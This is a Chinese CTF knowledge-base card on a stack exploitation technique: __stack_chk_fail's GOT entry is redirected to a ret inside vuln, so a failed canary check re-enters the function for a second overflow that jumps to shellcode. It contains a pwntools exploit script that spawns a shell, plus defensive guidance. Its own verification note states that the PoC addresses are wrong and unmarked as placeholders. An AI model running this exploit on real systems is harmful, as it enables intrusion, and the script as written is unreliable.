---
id: binary-pwn-stack-stack-chk-fail-got-reenter-vuln-ret-second-overflow-jmp-rsp
title: 没有 leave;ret 可用来迁移栈时，把 __stack_chk_fail 的 GOT 改成 vuln 内部的 ret，让 Canary 失败路径重新进入漏洞函数打第二轮溢出
type: scenario
domain: binary
path: binary/pwn/stack
technique: stack-chk-fail-got-reenter-vuln-ret-second-overflow-jmp-rsp-shellcode
tags:
- pwn
- stack-overflow
- canary
- got-hijack
- arbitrary-write
- jmp-rsp
- shellcode
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:22:20+08:00'
  notes: 本次核对未读取图片，仅依据正文与卡片正文。技法与原文一致：原文明确写「把 __stack_chk_fail 改成 vuln 中 ret 的地址，程序报错时仍会执行后面的代码进而栈溢出」，并用 jmp_rsp 跳到栈上 shellcode 打 ORW。但 PoC 地址与原文 exp 不符：原文 jmp_rsp=0x40081B、写入 stack_chk_fail_got 的值=0x4008EF、首轮 payload=0x400820，卡片写成 0x4011d9 与 0x4012b6 且未标注为占位符，按卡照做打不通，需按目标二进制重新核对地址
url: /docs/binary/pwn/stack/binary-pwn-stack-stack-chk-fail-got-reenter-vuln-ret-second-overflow-jmp-rsp/
draft: false
kb_aliases:
- __stack_chk_fail 改成 vuln 里的 ret
- canary 失败后重入漏洞函数
- 二次栈溢出 jmp rsp shellcode
- Inequable_Canary
- 改 GOT 让 canary 校验失败继续执行
---

## 一句话结论

程序同时给了「任意地址写」和「栈溢出」，但源码里找不到合适的 `leave; ret` 做栈迁移；此时把 `__stack_chk_fail@got` 写成漏洞函数 `vuln` 里那条 `ret` 指令的地址——Canary 校验失败时不会 abort，而是从 `vuln` 的 `ret` 处继续，函数正常返回后**再次进入 `vuln`**，于是可以发第二轮载荷，用程序里现成的 `jmp rsp` 跳到栈上 shellcode 执行。

## 原理

- Canary 机制只是「在 `ret` 前比较栈上的 canary 与 TLS 里的值，不等就调用 `__stack_chk_fail`」。真正被调用的地址来自 GOT 表项；只要 GOT 可写（非 Full RELRO）且存在任意地址写，这个「失败处理」就能被替换。
- 常见做法是把 GOT 改成 `leave; ret`，用 `leave` 把 RSP 拉到攻击者可控制的缓冲区。但这要求二进制里恰好存在 `leave; ret` gadget（或者在 libc 里能拿到且已泄 libc）——本类题目是「保护全开、无 libc 泄露」，找不到可用的 `leave;ret`。
- 退一步：把 GOT 改成 `vuln` 函数体内 `ret` 的地址。Canary 不匹配时控制流走到这条 `ret`，此时栈已经因溢出被改，`ret` 弹出的返回地址就是攻击者写的值——把它设成 `vuln` 的入口，就能**重入漏洞函数**。
- 重入的价值：`vuln` 内是 `read(0, buf, N)` 型输入，重入等于再给一次写栈的机会，而这次栈布局由攻击者完全掌控（第二轮的返回地址、canary 我们可以故意填错或直接跳过比较点）。
- 第二轮把返回地址覆盖成 `jmp rsp`：`jmp rsp` 使 RIP 跳到当前栈指针处，紧跟其后的字节就是 shellcode。因为不一定需要泄露 libc，也不需要知道栈地址，这条链只依赖「程序里有 `jmp rsp`」这一条即可。
- 若程序有沙箱禁 `execve`，shellcode 要写成 ORW（`open`/`read`/`write`）；不受限时 `execve("/bin/sh")` 即可。

## 触发条件

- Canary 开启，但 RELRO 不是 Full（`.got` 可写）。
- 存在任意地址写原语（常见形态：先输入「目标地址」再输入「值」），哪怕只能写一次/一个 qword。
- 存在栈溢出输入点，且溢出的缓冲区在 `ret` 前会被完整读入。
- 二进制内有 `jmp rsp`（或 `call rsp`/`push rsp; ret` 等价物），且栈可执行，或能先 `mprotect`。
- 找不到 `leave; ret` 或没有 libc 泄露时，本手法比常规栈迁移更省前提。

## 利用步骤

1. `checksec`：确认 Canary on、RELRO 非 Full。
2. 逆向定位三处：任意写原语、栈溢出点（记下偏移到返回地址）、以及 `vuln` 内部那条 `ret` 的地址（`objdump -d` 里 `vuln` 末尾的 `c9 c3` 之后那个 `c3`，或任意一条能正常返回的 `ret`）。
3. 用任意写原语把 `__stack_chk_fail@got` 覆盖为上述 `ret` 地址。
4. 第一次溢出：`b'A'*offset + p64(canary+1)` 之类制造 canary 不匹配，并把返回地址写成 `vuln` 入口。
5. 程序走到 `__stack_chk_fail` → 执行 `ret` → 回到 `vuln`；第二轮发 `p64(0)*n + p64(jmp_rsp) + shellcode`。
6. shellcode 按沙箱选择 `execve("/bin/sh")` 或 ORW；交互取回 flag。

## PoC

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
io = process('./canary')
elf = ELF('./canary')

vuln           = elf.sym['vuln']
ret_in_vuln    = 0x4012b6          # vuln 内那条 ret
jmp_rsp        = 0x4011d9          # 程序自带
stack_chk_got  = elf.got['__stack_chk_fail']
offset         = 0x28              # 到返回地址

# 1) 任意地址写：把 __stack_chk_fail@got 指向 vuln 内的 ret
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'addr: ', str(stack_chk_got).encode())
io.sendlineafter(b'value: ', str(ret_in_vuln).encode())

# 2) 第一轮溢出：canary 写错，返回地址设为 vuln（重入）
shellcode = asm(shellcraft.sh())
io.sendlineafter(b'> ', b'2')
io.sendline(b'A'*offset + p64(0xdeadbeef) + p64(vuln))

# 3) 第二轮溢出：jmp rsp 直接执行栈上 shellcode
io.sendlineafter(b'> ', b'2')
io.sendline(b'A'*offset + p64(0)*2 + p64(jmp_rsp) + shellcode)
io.interactive()
```

## 变体与关联

- 变体：若程序里有 `leave; ret`，优先走 [[ctf-pwn-stack-chk-fail-got-leave-ret-jmp-rsp-shellcode]] 的一次性栈迁移；本卡是「没有迁移 gadget」时的退路，靠「重入漏洞函数」换来第二次写栈机会。
- 变体：重入目标不一定是 `vuln` 本身，也可以是同文件里任一「读入缓冲区」的函数；关键是它能再触发一次可控 `read`。
- 变体：没有 `jmp rsp` 时，把 GOT 改成 `vuln` 里 `add rsp, X; ret` 的地址，重入后直接在栈上放 ROP 链（此时需要 libc 泄露）。
- 关联：[[ctf-pwn-format-canary-uaf-unsorted-ret2libc-all-protections]]（正统泄露 canary + libc 路线）。
- 关联：[[ctf-pwn-stack-chk-fail-got-leave-ret-jmp-rsp-shellcode]]（同为 GOT 劫持失败路径，迁移方式不同）。
- 边界：Full RELRO（GOT 只读）、无任何「重入后还能再读入」的输入点、栈不可执行且无 ROP 前置泄露时，本链不成立。

## 检测与防御

- 防御：编译时加 `-Wl,-z,relro,-z,now`（Full RELRO）让 GOT 只读，直接消灭这条路径。
- 防御：`-fstack-protector-all` + 栈不可执行（`-z noexecstack`）+ CET/Shadow Stack，使 `jmp rsp` 执行栈上数据失效。
- 防御：任何「任意地址写」原语都要限制目标范围（白名单数组下标、显式边界检查），这才是根因。
- 检测：运行期 `__stack_chk_fail@got` 内容偏离 libc 中的真实地址；进程在 canary 校验失败后没有立即终止而是继续执行/再次进入同一函数；短时间内同一入口出现两次溢出型输入。
- 响应：留存 core dump 分析被改的 GOT 与栈内容，回溯「任意写」原语的调用来源。
